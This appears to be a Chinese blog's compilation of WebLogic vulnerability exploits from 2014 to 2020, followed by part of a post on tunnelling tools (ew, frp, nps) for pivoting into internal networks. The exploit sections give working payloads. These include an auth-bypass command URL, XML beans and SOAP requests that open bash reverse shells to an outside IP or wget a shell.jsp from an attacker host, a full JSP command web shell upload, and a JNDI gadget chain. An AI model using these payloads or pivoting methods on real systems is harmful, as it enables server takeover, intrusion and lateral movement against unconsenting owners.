coherence组件iiop反序列化漏洞 (CVE-2020-14644) WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645 WebLogic CVE-2020-14756 T3IIOP反序列化RCE Weblogic 远程代码执行漏洞 CVE-2020-2883 Weblogic CVE-2020-2551 IIOP协议反序列化rce 3.2.1、 CVE-2020-14882&amp;14883（Weblogic RCE）（1）、介绍​ CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。 （2）、影响版本10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 14.1.1.0.0 （3）、利用​ CVE-2020-14882：允许未授权的用户绕过管理控制台的权限验证访问后台 ​ 远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。 ​ 访问以下URL，未授权访问到管理后台页面（低权限的用户）： http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal 目前是低权限用户，无法安装用户 CVE-2020-14883：允许后台任意用户通过HTTP协议执行任意命令 方法1 直接代码执行，创建文件 127.0.0.1:70001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/123');\") 方法2 构建一个恶意的xml文件放在能访问到的web服务器上 &lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;/bin/bash&lt;/value&gt; &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/1.1.1.1/8888 0&gt;&amp;1]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; 放在 http://1.1.1.1/rce.xml 执行后进行反弹 http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://1.1.1.1/rce.xml\") 3.2.2、CVE-2020-14841（weblogic jndi注入）（1）、介绍​ 参考文章 https://www.77169.net/html/270571.html （2）、影响版本10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 14.1.1.0.0 （3）、利用POC // JdbcRowSetImpl JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(\"rmi://192.168.3.254:8888/xsmd\"); MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor(); methodAttributeAccessor.setGetMethodName(\"getDatabaseMetaData\"); methodAttributeAccessor.setIsWriteOnly(true); methodAttributeAccessor.setAttributeName(\"UnicodeSec\"); LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, \"UnicodeSec\"); final ExtractorComparator comparator = new ExtractorComparator(extractor); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); Object[] q = new Object[]{jdbcRowSet, jdbcRowSet}; Reflections.setFieldValue(queue, \"queue\", q); Reflections.setFieldValue(queue, \"size\", 2); Field comparatorF = queue.getClass().getDeclaredField(\"comparator\"); comparatorF.setAccessible(true); comparatorF.set(queue, new ExtractorComparator(extractor)); 3.2.3、 CVE-2020-14756（WebLogic T3IIOP反序列化RCE）（1）、介绍​ 无 （2）、影响版本未找到 exp https://github.com/Y4er/CVE-2020-14645 （3）、利用3.2.4、CVE-2020-14645（WebLogic UniversalExtractor反序列化漏洞）（1）、介绍​ 攻击者可利用该漏洞实现远程代码执行。该反序列化的gadget存在与coherence包中。 （2）、影响版本10.3.6.0.0 12.2.1.4.0 12.2.1.3.0 12.1.3.0.0 14.1.1.0.0 （3）、利用exp https://github.com/Y4er/CVE-2020-14645 3.2.5、CVE-2020-14644 (Weblogic coherence组件iiop反序列化漏洞)（1）、介绍参考文章 https://www.cnblogs.com/potatsoSec/p/13451993.html （2）、影响版本12.2.1.3.0 12.1.3.0.0 14.1.1.0.0 （3）、利用exp https://github.com/potats0/cve_2020_14644 3.2.6、CVE-2020-2883（Weblogic 远程代码执行漏洞 ）（1）、介绍​ Weblogic 默认开启 T3 协议，攻击者可利用T3协议进行反序列化漏洞实现远程代码执行。 （2）、影响版本10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 （3）、利用exp https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2020-2883_cmd.py 3.2.7、CVE-2020-2551（Weblogic IIOP协议反序列化rce ）（1）、介绍​ 漏洞依然是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，在使用之前未经安全检查，导致恶意代码被执行。 （2）、影响版本10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 （3）、利用exp https://github.com/Y4er/CVE-2020-2551 3.3、2019Weblogic反序列化漏洞 CVE-2019-2890 Weblogic反序列化远程代码执行漏洞CVE-2019-2725 Weblogic反序列化漏洞 CVE-2019-2729 Weblogic任意文件读取漏洞（CVE-2019-2615)） Weblogic 文件上传漏洞（CVE-2019-2618） 3.3.1、CVE-2019-2890（Weblogic反序列化漏洞 ）（1）、介绍​ Weblogic在利用T3协议进行远程资源加载调用时，默认会进行黑名单过滤以保证反序列化安全。漏洞CVE-2019-2890绕过了Weblogic的反序列化黑名单，使攻击者可以通过T3协议对存在漏洞的Weblogic组件实施远程攻击，但该漏洞利用条件较高，官方也归类为需要身份认证。与CVE-2019-2725类似。 （2）、影响版本10.3.6.0 12.1.3.0 12.2.1.3 （3）、利用exp https://github.com/SukaraLin/CVE-2019-2890 判断是否存在漏洞，如下图所示则可能存在漏洞 http://ip:7001/_async/AsyncResponseService 开个web服务 放一个shell.jsp 通过以下请求包，上传到服务器 POST /_async/AsyncResponseService HTTP/1.1 Host: you ip:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Connection: close Content-Length: 858 content-type: text/xml &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt; &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;wget http://ip:端口/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body&gt; &lt;asy:onAsyncDelivery/&gt; &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 文件地址 http://ip:7001/_async/shell.jsp 3.3.2、CVE-2019-2729（Weblogic反序列化漏洞 ）（1）、介绍​ 是对CVE-2019-2725打的补丁被绕过了，使用标签替换标签。 （2）、影响版本10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 （3）、利用exp https://github.com/ruthlezs/CVE-2019-2729-Exploit python CVE-2019-2729.py -u 地址 -c whoami 3.3.3、CVE-2019-2725(Weblogic反序列化远程代码执行漏洞)（1）、介绍​ CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。与CVE-2019-2618类似。 （2）、影响版本10.* 12.1.3 （3）、利用漏洞存在的页面： /_async/AsyncResponseService 能访问就可能存在漏洞 开个web服务放shell.txt，上传到服务器 POST /_async/AsyncResponseService HTTP/1.1 Host: IP:PORT Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close Content-Length: 859 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt; &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;wget http://ip:端口/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body&gt; &lt;asy:onAsyncDelivery/&gt; &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 位置 ip:7001/bea_wls_deployment_internal/shell.jsp 3.3.4、CVE-2019-2618（Weblogic 文件上传漏洞）（1）、介绍​ 主要是利用了WebLogic组件中的DeploymentService接口，该接口支持向服务器上传任意文件。攻击者突破了OAM（Oracle Access Management）认证，设置wl_request_type参数为app_upload，构造文件上传格式的POST请求包，上传jsp木马文件，进而可以获得整个服务器的权限。 （2）、影响版本10.3.6.0 12.1.3.0 12.2.1.3 （3）、利用前提是要有账号密码 上传成功后会返回文件地址 POST包 POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1 Host: ip:7001 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.21.0 username: weblogic wl_request_type: app_upload cache-control: no-cache wl_upload_application_name: ../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war serverName: weblogic password: 12345.com content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW archive: true server_version: 10.3.6.0 wl_upload_delta: true Content-Length: 1083 ------WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name=\"shell.jsp\"; filename=\"shell.jsp\" Content-Type: false &lt;%@ page import=\"java.util.*,java.io.*\"%&gt; &lt;% %&gt; &lt;HTML&gt;&lt;BODY&gt; Commands with JSP &lt;FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"&gt; &lt;INPUT TYPE=\"text\" NAME=\"cmd\"&gt; &lt;INPUT TYPE=\"submit\" VALUE=\"Send\"&gt; &lt;/FORM&gt; &lt;pre&gt; &lt;% if (request.getParameter(\"cmd\") != null) { out.println(\"Command: \" + request.getParameter(\"cmd\") + \"&lt;BR&gt;\"); Process p; if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){ p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); } else{ p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %&gt; &lt;/pre&gt; &lt;/BODY&gt;&lt;/HTML&gt; ------WebKitFormBoundary7MA4YWxkTrZu0gW-- 地址 ip:7001/bea_wls_deployment_internal/shell.jsp 3.3.5、CVE-2019-2615（Weblogic任意文件读取漏洞)（1）、介绍​ 利用该漏洞，攻击者可以在已知用户名密码的情况下读取WebLogic服务器中的任意文件。 （2）、影响版本10.3.6.0 12.1.3.0 12.2.1.3 （3）、利用 2.4、2018年weblogic 反序列化漏洞 CVE-2018-3252 Weblogic反序列化远程代码执行漏洞 CVE-2018-3245 Weblogic远程代码执行漏洞 CVE-2018-3191 Weblogic任意文件上传漏洞（CVE-2018-2894） Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893 Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628 2.4.1、CVE-2018-3252（weblogic 反序列化漏洞）（1）、介绍​ weblogic DeploymentService组件的反序列化漏洞。 （2）、影响版本未找到 （3）、利用POC https://github.com/pyn3rd/CVE-2018-3252 2.4.2、CVE-2018-3245（Weblogic反序列化远程代码执行漏洞 ）（1）、介绍​ 该漏洞通过 JRMP 协议利用 RMI 机制的缺陷达到执行任意反序列化代码的目的。攻击者可以在未授权的情况下将 payload 封装在 T3 协议中，通过对 T3 协议中的 payload 进行反序列化，从而实现对存在漏洞的 WebLogic 组件进行远程攻击，执行任意代码并可获取目标系统的所有权限。 （2）、影响版本10.3.6.0 12.1.3.0 12.2.1.3 （3）、利用POC https://github.com/pyn3rd/CVE-2018-3245 2.4.3、CVE-2018-3191（Weblogic远程代码执行漏洞 ）（1）、介绍​ 该漏洞允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。 （2）、影响版本10.3.6.0 12.1.3.0 12.2.1.0 12.2.1.1 （3）、利用POC https://github.com/pyn3rd/CVE-2018-3191 2.4.4、CVE-2018-2894（Weblogic任意文件上传漏洞）（1）、介绍​ WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do。 （2）、影响版本10.3.6.0 12.1.3.0 12.2.1.2 12.2.1.3 （3）、利用首先要能够登录后台 /console访问后台登陆后 base_domain的高级配置中 启用web服务测试页，记得在最下面保存。。。 再访问 http://XXX:7001/ws_utc/config.do 设置当前工作目录为 /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css 这个是ws_utc应用的静态文件css目录，访问这个是不需要权限的 然后安全添加jsp 通过审查元素查看时间戳 /ws_utc/css/config/keystore/[时间戳]_[文件名] 成功访问 /ws_utc/css/config/keystore/1627709344373_ce.jsp 2.4.5、CVE-2018-2893（Weblogic WLS核心组件反序列化漏洞）（1）、介绍​ 此漏洞产生于WebLogic的T3服务，因此可通过控制T3协议的访问来临时阻断针对该漏洞的攻击。当开放WebLogic控制台端口（默认为7001端口）时，T3服务会默认开启。 （2）、影响版本10.3.6.0 12.1.3.0 12.2.1.2 12.2.1.3 （3）、利用https://github.com/ryanInf/CVE-2018-2893 2.4.6、CVE-2018-2628（Weblogic WLS Core Components 反序列化命令执行漏洞）（1）、介绍（2）、影响版本10.3.6.0 12.2.1.2 12.2.1.3 12.1.3.0 10.3.6.0 12.2.1.2 12.2.1.3 12.1.3.0 （3）、利用POC https://github.com/shengqi158/CVE-2018-2628 2.5、其他年份WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271） Weblogic 反序列化漏洞 CVE-2017-3506 Weblogic 反序列化漏洞 CVE-2017-3248 Weblogic SSRF漏洞 CVE-2014-4210 2.5.1、CVE-2017-10271（WebLogic XMLDecoder反序列化漏洞）（1）、介绍​ 通过构建发送post请求，使用精心构造的xml数据造成任意代码执行 （2）、影响版本10.3.6.0.0 12.1.3.0.0 12.2.1.1.0 （3）、利用初步判断 ip/wls-wsat/CoordinatorPortType11 存在下图则说明可能存在漏洞 写入文件，ip/wls-wsat/test.txt POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 192.168.8.148:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Upgrade-Insecure-Requests: 1 Content-Type: text/xml Content-Length: 756 &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java version=\"1.6.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;object class=\"java.io.PrintWriter\"&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=\"println\"&gt; &lt;string&gt;test(写入内容)&lt;/string&gt;&lt;/void&gt;&lt;void method=\"close\"/&gt; &lt;/object&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 反弹shell（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）： &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;bash -i &gt;&amp; /dev/tcp/接收shell的ip/8888 0&gt;&amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 2.5.2、CVE-2017-3506（Weblogic 反序列化漏洞）（1）、介绍​ 一个XML的反序列化漏洞导致的命令执行。 （2）、影响版本10.3.6.0 12.1.3.0 12.2.1.0 12.2.1.1 12.2.1.2 （3）、利用详细讲解 https://github.com/bit4woo/code2sec.com/blob/master/weblogic%E6%BC%8F%E6%B4%9ECVE-2017-3506%E5%A4%8D%E7%8E%B0%EF%BC%9AWeb%20Services%E6%A8%A1%E5%9D%97%E7%9A%84%E6%BC%8F%E6%B4%9E.md 2.5.3、CVE-2017-3248（1）、介绍 参考文章 https://blog.csdn.net/caiqiiqi/article/details/84246779 （2）、影响版本 10.3.6.0， 12.1.3.0 12.2.1.0 12.2.1.1 （3）、利用 https://github.com/quentinhardy/scriptsAndExploits 2.5.4、CVE-2014-4210（Weblogic SSRF漏洞 ）（1）、介绍​ SSRF（Server-Side Request Forgery），服务端请求伪造，是一种由攻击者构造形成由服务端发起请求的一个漏洞，一般情况下，SSRF攻击的目标是从外部网络无法访问的内部系统。 （2）、影响版本10.0.2.0 10.3.6.0 （3）、利用漏洞位置在uddiexplorer下的SearchPublicRegistries.jsp处 http://ip:7001//uddiexplorer/SearchPublicRegistries.jsp 访问 http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 访问后显示404说明存在该漏洞 通过burg抓包查看相关的返回信息 返回该信息说明开放了7001端口 返回 返回could not connect over HTTP to server，说明不存在此端口 四、总结​ 本文是对Weblogic漏洞的整理，大量信息来源于互联网，如有侵权请告知删除、除了其中的部分内容通过实践证明了，其余部分我并没有实践，所以仅供参考。关于文章中包含的poc或者工具我已全部下载，但没有验证是否存在问题。若需要，可在公众号（诚默的每周学习总结）回复关键词：weblogic，得到下载地址。 ​ 以上内容仅供学习交流。","categories":[],"tags":[{"name":"weblogic","slug":"weblogic","permalink":"https://k3vi-07.github.io/tags/weblogic/"}],"author":"诚默"},{"title":"内网穿透总结","slug":"内网穿透总结","date":"2021-08-02T02:11:30.000Z","updated":"2023-01-10T07:56:40.400Z","comments":true,"path":"2021/08/02/内网穿透总结/","link":"","permalink":"https://k3vi-07.github.io/2021/08/02/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%80%BB%E7%BB%93/","excerpt":"一、渗透测试中的内网穿透​ 当两个不同网络环境的机器想要互相访问的时候，这个时候外网的机器无法单方面的访问内网的机器。所以我们要借助内网穿透工具（配置进内网的流量隧道）进行访问。 ​ 攻击者在成功入侵某一台对外服务器后也会利用以上代理原理进行内网横向渗透进一步扩大战果，上传代理工具至对外服务器将其改造为跳板机，建立通往内网的通信隧道。 二、内网穿透常用工具ew、frp、nps、reGeorg、Proxifier(socks5客户端)","text":"一、渗透测试中的内网穿透​ 当两个不同网络环境的机器想要互相访问的时候，这个时候外网的机器无法单方面的访问内网的机器。所以我们要借助内网穿透工具（配置进内网的流量隧道）进行访问。 ​ 攻击者在成功入侵某一台对外服务器后也会利用以上代理原理进行内网横向渗透进一步扩大战果，上传代理工具至对外服务器将其改造为跳板机，建立通往内网的通信隧道。 二、内网穿透常用工具ew、frp、nps、reGeorg、Proxifier(socks5客户端) 2.1、ew2.1.1、介绍​ ew 全称是EarchWorm，是⼀套轻量便携且功能强⼤的⽹络穿透⼯具，基于标准C开发，具有socks5 代理、端⼝转发和端⼝映射三⼤功能，可在复杂⽹络环境下完成⽹络穿透，且⽀持全平台 (Windows/Linux/Mac)。该⼯具能够以“正向”、“反向”、“多级级联”等⽅式打通⼀条⽹络隧道，直达⽹络 深处，⽤蚯蚓独有的⼿段突破⽹络限制，给防⽕墙松⼟。 2.1.2、语法：ew有六种模式，分别是： ssocksd：是⽤于普通⽹络环境下的正向连接 rcsocks ：⽤于反向连接。 rssocks：⽤于反向连接。 lcx_slave：⽤于复杂⽹络环境的多级连接。 lcx_listen ：⽤于复杂⽹络环境的多级连接。 lcx_tran：⽤于复杂⽹络环境的多级连接。 常⽤参数 -l：指定要监听的本地端⼝ -d：指定要反弹到的机器 ip -e：指定要反弹到的机器端⼝ -f：指定要主动连接的机器 ip -g：指定要主动连接的机器端⼝ -t：指定超时时⻓,默认为 1000 2.2.3、实际使用当我们拿下了一台目标机器，存在内网。那我们就要建立一条隧道，然后通过代理进去 当目标机器有公网ip的话 VPS：./ew -s rcsocks -l 1080 -e 888 目标机器：./ew -s ssocksd -l 1080 我们设置代理为目标ip:888，就能让我们的流量进入对方主机中 大部分为没有公网ip的情况 （1）、端口映射 在VPS上执行，监听本地的999端口 ew.exe -s ssocksd -l 999 再服务器A上执行如下命令，将VPS的888端口和服务器的999端口连接起来 ./ew -s lcx_slave -d 1.1.1.1 -e 888 -f 192.168.10.128 -g 3389 远程桌面连接1.1.1.1:888就是在连接服务器A(192.168.10.128)的3389端口 （2）、搭建Socks隧道 1、将VPS的1080端口监听的流量转发到888端口 2、然后让目标机器主动连接我们vps的888端口 3、然后我们设置代理为vps的1080端口，那我们从1080端口走的流量就可以转发到888再到目标机器中 VPS：./ew -s rcsocks -l 1080 -e 888 目标机器：./ew -s rssocks -d 1.1.1.1 -e 888 （3）、二级代理 存在vps、主机A、主机B、服务器C:80（web服务），web网站是主机A映射到公网地址提供web服务 A、B、C只有A通外网，A只能访问B，B能访问A、C，C只有B能访问。 那我们要怎样才能直接访问C的服务呢 在vps上开启监听，将VPS的1088端口的流量转发给888端口 ./ew -s lcx_listen -l 1080 -e 888 在B上执行，监听本地的999端口 ew.exe -s ssocksd -l 999 再服务器A上执行如下命令，将VPS的888端口和服务器B的999端口连接起来 ./ew -s lcx_slave -d ip(vps) -e 888 -f ip(主机B) -g 999 这样就将A作为中转，将VPS的888端口的流量，发给主机B的999端口。 我们设置代理为vps的1080端口，就可以直接走B的流量。然后访问C的地址就可以了。 （4）、三级代理 与二级代理比多了个主机D，挡在B和服务器C之间 只有D能访问服务器C的web服务 首先，在VPS上执行如下命令，将1080端口监听的流量都转发到本地的888端口 VPS：./ew -s rcsocks -l 1080 -e 888 然后在主机A上执行如下命令，作为中转将VPS的888端口和内网主机B的999端口连接起来 主机A：./ew -s lcx_slave -d ip(VPS) -e 888 -f ip(主机B) -g 999 接着在主机B上执行如下命令，将监听的999端口的流量都转发给本地的777端口 主机B：ew.exe -s lcx_listen -l 999 -e 777 最后再主机D上执行如下命令，反弹流量到主机B的777端口 主机D：./ew -s rssocks -d ip(主机B) -e 777 设置代理为vps的1080端口后 VPS:1080-&gt;888-&gt;B:999-&gt;777-&gt;D 就此流量从D走，能够访问服务器C的web服务了 2.2 frp2.2.1、介绍​ frp 是一个高性能的反向代理应用，支持 tcp, udp, http, https 协议。支持MAC、Windows、Linux。 ​ frpc是我们的客户端 ，frps是我们的服务端。 frpc.ini是我们的客户端配置文件 。frps.ini是我们的服务端配置文件。 2.2.2、参数介绍简单的配置 frps.int [common] bind_port = 11111 #绑定的端⼝ dashboard_port = 22222 #管理端⼝ dashboard_user = root #管理的⽤户名 dashboard_pwd = 123456 #管理⽤户的密码 token = 1q2w3e #客户端服务端连接的密码 heartbeat_timeout = 90 #⼼跳超时时间 max_pool_count = 5 #最⼤同时连接数 frpc.ini [common] server_addr = 1.1.1.1 #服务器地址 server_port = 11111 #服务器端口 token = 1q2w3e #服务器连接密码 [test] #连接名 type=tcp #协议 local_ip = 127.0.0.1 #需要被代理的ip local_port = 3389 #需要被代理的端口 remote_port = 3389 #映射到服务端的端口 2.2.3、实际使用ubuntu启动服务端 frps -c frps.ini 然后访问服务器ip:管理端口，输入管理账号和密码进入页面 可以看到现在是没有任何端口映射的 （1）、端口映射 接下来我打算将我的windows虚拟机的3389端口，映射到我的公网服务器上的10000端口上面‘ 那我需要怎么配置呢 [common] server_addr = 1.1.1.1 #服务器地址 server_port = 11111 #服务器端口 token = 1q2w3e #服务器连接密码 [虚拟机win10] #连接名 type=tcp #要建立tcp连接 local_ip = 127.0.0.1 #需要被代理的ip， local_port = 3389 #需要被代理的端口 remote_port = 10000 #映射到服务端的端口 然后 frpc.exe -c frpc.ini 这样服务器端就出现了 远程连接我服务端的ip:10000，成功提示我输入账号密码 断开后就提示离线了 在内网的其他机器上，映射我虚拟机的3389端口 就把ip从127.0.0.1改成我的虚拟机ip（ 192.168.107.129）就可以了，端口也改下 [common] server_addr = 1.1.1.1 #服务器地址 server_port = 11111 #服务器端口 token = 1q2w3e #服务器连接密码 [虚拟机win10-2] #连接名 type=tcp #协议 local_ip = 192.168.107.129 #需要被代理的ip， local_port = 3389 #需要被代理的端口 remote_port = 10001 #映射到服务端的端口 成功 （2）、建立socks5隧道 frpc.exe -c frpc.ini [common] server_addr = 1.1.1.1#连接的服务器 ip server_port = 11111 #连接的服务器端口 token=1q2w3e #连接的服务器密钥 pool_count = 5 #同时连接数 protocol = tcp #协议类型 health_check_type = tcp health_check_interval_s = 100 [test] remote_port = 10000 plugin = socks5 use_encryption = true #是否加密 use_compression = true plugin_user= admin plugin_passwd= admin 然后我们本机设置socks5代理为：1.1.1.1的10000端口即可。 这样我们就能够直接上内网了。 （3）、二级代理 还是这种情况，怎么让流量从主机B走呢 通过主机A做跳板，让socks代理建设到内网C主机中 思路是通过将主机A既作服务端，也做客户端 就不设置多的东西了 主机B的frpc.ini设置 [common] server_addr = 主机A的ip #连接的服务器ip server_port = 11111 #链接的服务器端口 token=1q2w3e [test] remote_port = 10000 plugin = socks5 主机B建立个socks5隧道到主机A的10000端口上 然后主机A的服务器端frps.ini配置 [common] bind_port = 11111 #绑定的端⼝ dashboard_port = 22222 #管理端⼝ dashboard_user = root #管理的⽤户名 dashboard_pwd = 123456 #管理⽤户的密码 token = 1q2w3e #客户端服务端连接的密码 heartbeat_timeout = 90 #⼼跳超时时间 max_pool_count = 5 #最⼤同时连接数 主机A的frpc.ini配置 [common] server_addr = 1.1.1.1 #服务器地址 server_port = 11111 #服务器端口 token = 1q2w3e #服务器连接密码 [test] #连接名 type=tcp #协议 local_ip = 主机B-ip #需要被代理的ip local_port = 10000 #需要被代理的端口 remote_port = 10001 #映射到服务端的端口 A的10000端口就映射到VPS服务端的10001端口上了 我们再设置代理为VPS:10001，走的就是主机B的流量。 （4）、三级代理 将主机D上建立一个socks5隧道 到 主机B的10000端口 D socks5—&gt;B:10000 再将主机B的10000端口映射到 主机A的10001端口 B:10000—&gt;A:10001 主机A再将10001端口映射到VPS的10002端口即可 A:10001—&gt;VPS:10002 2.3、nps2.3.1、介绍​ nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。 官网文档：https://ehang-io.github.io/nps/#/ 2.3.2、参数介绍服务端启动 下载完服务器压缩包后，解压，然后进入解压后的文件夹 执行安装命令 linux sudo ./nps install 